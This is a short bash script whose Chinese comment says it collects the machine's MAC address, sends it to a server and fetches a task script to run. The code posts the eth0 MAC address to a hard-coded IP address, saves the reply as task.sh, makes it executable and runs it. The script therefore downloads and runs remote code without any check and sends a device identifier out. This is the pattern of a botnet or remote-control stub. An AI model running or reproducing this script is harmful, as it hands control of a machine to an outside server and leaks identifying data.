#!/bin/bash

#
# 用于收集mac地址后，向某服务器发送地址，并且获取任务脚本执行
#


mac=$(ifconfig eth0 | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
wget --default-page=task.sh --post-data="mac=${mac}" http://89.163.220.64:3000 
chmod +x task.sh
./task.sh
